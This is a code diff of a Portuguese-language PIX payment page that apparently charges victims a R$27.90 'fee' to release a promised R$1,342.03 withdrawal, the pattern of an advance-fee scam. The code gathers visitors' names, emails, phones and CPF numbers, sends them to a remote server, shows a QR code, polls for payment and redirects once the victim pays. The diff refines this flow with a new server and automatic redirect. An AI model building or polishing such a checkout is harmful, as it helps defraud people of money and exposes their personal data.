@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700;900&display=swap" rel="stylesheet">
 <style>
-    /* Estilos (Mantendo o design Clean aprovado) */
+    /* ESTILOS ORIGINAIS INTACTOS */
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
     .button-container { display: flex; justify-content: center; align-items: center; width: 100%; padding: 20px; }
     
@@ -24,7 +24,7 @@
         100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 95, 44, 0); }
     }
 
-    /* Modal */
+    /* Modal Original */
     .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 9998; backdrop-filter: blur(5px); }
     .modal-pix { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: white; padding: 30px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); z-index: 9999; text-align: center; width: 90%; max-width: 400px; }
     #qr_code_div img { margin: 20px auto; border-radius: 10px; max-width: 100%; border: 2px solid #eee; }
@@ -45,14 +45,20 @@
     <p style="color:#666; font-size:13px; margin-bottom:15px;">Finalize o pagamento para liberar seu saque.</p>
     <div id="qr_code_div"></div>
     <textarea id="txt_codigo" style="width:100%; height:60px; margin-top:10px; background:#f5f5f5; border:1px solid #ddd; border-radius:8px; padding:10px; font-size:12px; color:#555;" readonly>Gerando PIX...</textarea>
-    <button class="btn-copiar" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
+    <button class="btn-copiar" id="btn_copy" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
+    
+    <p id="status_msg" style="font-size: 12px; color: #888; margin-top: 15px;">
+        Aguardando confirmação do banco...
+    </p>
 </div>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
-
 <script>
-    // --- FUNÇÃO PARA PEGAR PARÂMETROS DA URL ---
-    // É isso que o seu desenvolvedor pediu. Ele olha o link e extrai os dados.
+    // ==========================================================
+    // CONFIGURAÇÕES DO NOVO SERVIDOR
+    // ==========================================================
+    const API_URL = "https://checkoutfinal.onrender.com"; // Seu servidor atualizado
+    const PROXIMA_ETAPA = "https://SEU_SITE.com/pagina-final"; // 🔴 COLOQUE A PRÓXIMA PÁGINA AQUI
+
     function getURLParameter(name) {
         const urlParams = new URLSearchParams(window.location.search);
         return urlParams.get(name);
@@ -63,35 +69,24 @@
         btn.innerHTML = "PROCESSANDO...";
         btn.disabled = true;
 
-        // 1. CAPTURA DOS DADOS DIRETO DA URL (PRIORIDADE TOTAL)
-        // O código agora busca ?nome=X&email=Y&cpf=Z na barra de endereço
         const urlNome = getURLParameter('nome');
         const urlEmail = getURLParameter('email');
-        const urlPhone = getURLParameter('phone'); // ou 'telefone' dependendo de como enviou
+        const urlPhone = getURLParameter('phone');
         const urlCpf = getURLParameter('cpf');
 
-        // Backup do LocalStorage (caso a URL esteja limpa)
         const storedData = JSON.parse(localStorage.getItem('dadosUsuario') || '{}');
 
-        // 2. DEFINIÇÃO FINAL DOS DADOS (Url > Memória > Padrão)
         const finalNome = urlNome || storedData.nome || "Cliente Consumidor";
         const finalEmail = urlEmail || storedData.email || "cliente@pagamento.com";
         const finalPhone = urlPhone || storedData.telefone || "(11) 99999-9999";
         const finalCpf = urlCpf || storedData.documento || storedData.cpf || "00000000000";
 
-        // LOG PARA SEU DESENVOLVEDOR VER NO CONSOLE (F12)
-        console.log("--> DADOS CAPTURADOS:");
-        console.log("Nome:", finalNome);
-        console.log("Email:", finalEmail);
-        console.log("CPF:", finalCpf);
-        console.log("Phone:", finalPhone);
-
-        // 3. ENVIA PARA O SERVIDOR
-        fetch("https://checkout-pix-profissional.onrender.com/pix", {
+        // CHAMA O SEU SERVIDOR NOVO
+        fetch(`${API_URL}/pix`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ 
-                valor: "27.90", 
+                valor: "27.90", // Valor original mantido
                 name: finalNome,
                 email: finalEmail,
                 phone: finalPhone,
@@ -101,19 +96,38 @@
         .then(res => res.json())
         .then(data => {
             if (data.success) {
+                // ABRE O SEU MODAL ORIGINAL
                 document.getElementById("overlay").style.display = "block";
                 document.getElementById("modal_pix").style.display = "block";
+                
+                // PREENCHE OS DADOS
                 document.getElementById("txt_codigo").value = data.payload;
 
+                // QR CODE À PROVA DE FALHAS (A mesma solução que funcionou no index)
                 const qrDiv = document.getElementById("qr_code_div");
-                qrDiv.innerHTML = "";
-                
-                if(data.encodedImage && data.encodedImage.length > 50) {
-                     const src = data.encodedImage.startsWith('http') ? data.encodedImage : `data:image/png;base64,${data.encodedImage}`;
-                     qrDiv.innerHTML = `<img src="${src}">`;
-                } else {
-                    new QRCode(qrDiv, { text: data.payload, width: 200, height: 200 });
-                }
+                qrDiv.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.payload)}">`;
+
+                // ==========================================================
+                // 🔴 MONITORAMENTO DO CAUÊ (PULA DE PÁGINA AUTOMATICAMENTE)
+                // ==========================================================
+                const monitoramento = setInterval(() => {
+                    fetch(`${API_URL}/check-status/${data.transactionId}`)
+                    .then(r => r.json())
+                    .then(resStatus => {
+                        if(resStatus.paid === true) {
+                            clearInterval(monitoramento);
+                            document.getElementById('status_msg').innerText = "🚀 Pagamento aprovado! Liberando saque...";
+                            document.getElementById('status_msg').style.color = "#28a745";
+                            document.getElementById('status_msg').style.fontWeight = "bold";
+                            
+                            setTimeout(() => {
+                                window.location.href = PROXIMA_ETAPA;
+                            }, 1500);
+                        }
+                    })
+                    .catch(err => console.log("Aguardando..."));
+                }, 3000);
+
             } else {
                 alert("Erro: " + (data.message || "Tente novamente."));
                 btn.innerHTML = "RESGATAR R$ 1.342,03";
@@ -133,7 +147,15 @@
         copyText.select();
         copyText.setSelectionRange(0, 99999);
         navigator.clipboard.writeText(copyText.value);
-        alert("Código PIX copiado!");
+        
+        const btnCopy = document.getElementById('btn_copy');
+        btnCopy.innerText = "✅ CÓDIGO COPIADO!";
+        btnCopy.style.background = "#1e7e34";
+        
+        setTimeout(() => {
+            btnCopy.innerText = "COPIAR CÓDIGO PIX";
+            btnCopy.style.background = "#28a745";
+        }, 3000);
     }
 </script>
 
